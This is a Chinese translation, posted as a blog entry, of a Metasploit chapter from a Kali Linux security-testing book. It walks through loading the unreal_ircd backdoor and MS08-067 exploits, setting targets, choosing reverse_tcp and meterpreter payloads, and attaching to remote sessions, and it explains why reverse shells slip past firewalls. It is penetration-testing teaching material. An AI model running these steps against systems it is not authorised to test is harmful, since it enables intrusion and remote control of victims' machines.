---
layout: post
title: "【翻译】Basic Security Testing with Kali Linux (2014)"
desc: "【翻译】Basic Security Testing with Kali Linux (2014)"
date: 2016-09-18
keywords: [Linux,Translate]
tags: [Linux,Translate]
categories: [Linux]
---

**前两章只是介绍安装Kali及配置环境等基本问题，不再翻译赘述**  

# 第三章 —— Metasploit

## 介绍

对于安全测试来说，Metasploit绝对是最酷的工具之一。Metasploit提供了一个完整的框架，或者说是安全测试的乐园。  
![alt text](/../static/img/blog/BasicSecurity/0.png)  
Metasploit框架是一个综合的测试漏洞的平台，并且可以执行溢出测试。它装载着超过1000个exploit，数以百计的payload和多种编码方式。  
我们将会在本章学习Metasploit的基础，在之后的章节中展示如何使用Metasploit渗透目标。
如果你已经很熟悉使用Metasploit，可以跳过本章或者将它作为一个参考。 

## 更新

更新Metasploit只需要执行 mfsupdate。(通过Rapid7(https://community.rapid7.com/thread/3007)网站了解到Metasploit会同步每周的Kali更新)  

## 概述

你可以通过多种方式启动Metasploit，从启动菜单或者从终端。  

* /Kali Linux/Top Ten Security Tools/Metasploit framework  
* /Kali Linux/Exploitation Tools/Metasploit  
* "mfsconsole" in a terminal  

![alt text](/../static/img/blog/BasicSecurity/1.png)  
如果你之前从未使用过Metasploit，它可能会令你感到困惑，但是你一旦明白它是如何工作的，你就可以用它做一些令人震惊的事情了！  

使用Metasploit攻击一个目标系统通常包括：  

1. 装载一个 exploit  
2. 设置 exploit 选项  
3. 装载一个payload  
4. 设置 payload 选项  
5. 执行 exploit  
6. 连接远程目标系统  
7. 执行远程操作  

![alt text](/../static/img/blog/BasicSecurity/2.png)  
依赖于 exploit 的类型，一旦exploit成功执行，我们通常会获取一个远程计算机的Shell或者一个Metasploit的Shell。  
一个远程Shell是基于远程终端连接或者文字版的远程桌面(Windows用户，它允许我们键入命令行)。  
但是一个Metasploit的Shell提供大量的有趣的实用的程序以便我们获取有关目标主机的信息、控制像摄像头和麦克风的设备、甚至将它作为跳板使我们获取网络权限。  
当然，如果需要，你也可以将它作为一个普通的Shell使用。  
大多数情况下，这取决于你尝试进行的事，一个 Metasploit 的Shell会比一个普通的Shell有很多优势。  

## 装载 Exploit

如果你想查看所有的 exploit，键入 *show exploits*。  
msf> show exploits  
但是使用 search 命令会更快的找到你想要的exploit，只需要键入 search 和你想要查找的信息。  
*如果你看到这样 一条错误：[!] Database not connected or cache not built, using slow
search*，你需要做的就是在运行msfconsole之前启动 PostSQL数据库，以下命令可以启动数据库：  

* service postgresql start  
* service metasploit start
* msfconsole

![alt text](/../static/img/blog/BasicSecurity/3.png)  
通过名字搜索。只需要键入 search 和你想要的文本。  
![alt text](/../static/img/blog/BasicSecurity/4.png)  
通过CVE ID号搜索。  
![alt text](/../static/img/blog/BasicSecurity/5.png)  
查看今年所有的CVE号。  
![alt text](/../static/img/blog/BasicSecurity/6.png)  

通过 info 查看exploit的详细信息。  
msf > info exploit/unix/irc/unreal_ircd_3281_backdoor  
![alt text](/../static/img/blog/BasicSecurity/7.png)  

我们使用 use 装载exploit  
![alt text](/../static/img/blog/BasicSecurity/8.png)  

## 设置Exploit选项

我们使用 set + 变量名 来设置选项。  
set Variable Name Value  

使用 show options 查看我们需要设置的变量。  
![alt text](/../static/img/blog/BasicSecurity/9.png)  
这个exploit只使用两个主要变量，RHOST和RPORT。  
![alt text](/../static/img/blog/BasicSecurity/10.png)  
再次使用 show options 查看我们设置的变量。  
![alt text](/../static/img/blog/BasicSecurity/11.png)  

现在就可以使用 exploit 来执行该exploit。  

## 多种目标类型

unreal后门 是一个相当简单的exploit。有些exploit有很多变量需要设置并且他们有的甚至有一些可选变量。  
当你使用Metasploit时，你将会发现有些exploit有多种目标可以攻击，并且目标类型需要被设置。使用 show targets 查看所有目标类型。  

## 获取Windows XP的远程Shell

MS08-067漏洞是Windows XP上一个很出名的漏洞。  

1. 开始，我们需要装载exploit：msf > use exploit/windows/smb/ms08_067_netapi  
2. 查看参数： show options  
   ![alt text](/../static/img/blog/BasicSecurity/12.png)  
    可以看到默认目标类型是 *Automatic Targeting*。有时使用自动目标类型会比指定目标更好。  
3. 如果想要指定目标类型，使用 show options  
   ![alt text](/../static/img/blog/BasicSecurity/13.png)  
4. 之后使用 set target ID 设置目标  
   ![alt text](/../static/img/blog/BasicSecurity/14.png)  
5. 如果需要的话，我们也可以设置高级选项，使用 show advanced  
   ![alt text](/../static/img/blog/BasicSecurity/15.png)  
6. 大多数exploits中，我们还需要装载payload  

## 装载payload

如果你成功溢出了一台主机，但是什么都不能做，那还有什么劲？payload允许你使用溢出主机系统做一些功能性的事。  
Metasploit提供了很多不同的payload供你使用。使用 show payloads 查看所有payload。  
![alt text](/../static/img/blog/BasicSecurity/16.png)  

大多数的payload命名形如 *Operating System/Shell Type*：  

* set payload/osx/x86/shell_reverse_tcp  
* set payload/linux/x64/shell_reverse_tcp  
* set payload/windows/shell_reverse_tcp  
* set payload/windows/meterpreter/reverse_tcp  

最流行的payload类型是 shell，普通shell或者Metasploit的Shell。  
如果我们只是想使用终端Shell执行远程命令，就使用标准Shell；如果我们想要操作会话并且执行扩展命令，就使用Metasploit的Shell。  

*There are different types of ways that the payloads communicate back to the attacking system. I usually prefer reverse_tcp shells as once they are executed on the target system, they tell the attacking machine to connect back out to our Kali system. The big advantage to this is that with the victim machine technically “initiating” the connection out, it usually is not blocked by the Firewall, as a connection trying to come in from the outside most likely will.*  

一旦我们选好payload，使用 set 命令装载 payload  
![alt text](/../static/img/blog/BasicSecurity/17.png)  

## 设置payload选项

通常payload设置包括exploit连接的IP地址和端口。  
使用 show options 查看payload设置。  
![alt text](/../static/img/blog/BasicSecurity/18.png)  
正如所见，出现了一个名为“payload options”的区域，我们有三个新的可设置选项 —— EXITFUNC LHOST LPORT。  
我们使用默认的 EXITFUNC 和 LPORT 设置，设置LHOST。  
![alt text](/../static/img/blog/BasicSecurity/19.png)  

## 执行exploit

使用 exploit 执行，成功执行的话，我们会得到一个远程会话  
![alt text](/../static/img/blog/BasicSecurity/20.png)  

## 连接远程会话

一旦我们成功溢出就可以查看我们创建的任意远程会话。键入 sessions 即可查看。  
任意一个创建的会话会显示 IP地址、主机名和目标系统用户名。  
![alt text](/../static/img/blog/BasicSecurity/21.png)  
现在我们可以使用 session -i ID 连接会话  
![alt text](/../static/img/blog/BasicSecurity/22.png)  
